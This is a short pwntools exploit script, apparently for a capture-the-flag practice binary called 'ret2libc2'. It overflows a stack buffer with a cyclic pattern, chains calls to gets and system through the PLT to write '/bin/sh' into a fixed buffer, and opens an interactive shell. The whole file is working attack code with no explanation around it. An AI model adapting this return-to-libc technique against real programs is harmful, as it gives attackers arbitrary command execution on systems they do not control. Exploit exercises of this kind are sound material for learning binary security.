from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "debug"
p = gdb.debug("./ret2libc2")

esp = 0xffffcca0
ebp = 0xffffcd28
offset = ebp - (esp + 0x1c) + 4

gets_plt = 0x08048460
system_plt = 0x08048490
buf2 = 0x0804A080
bin_sh = "/bin/sh"

pause()
p.sendline(
    cyclic(offset) + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)
)
pause()
p.sendline(
    bin_sh
)
p.interactive()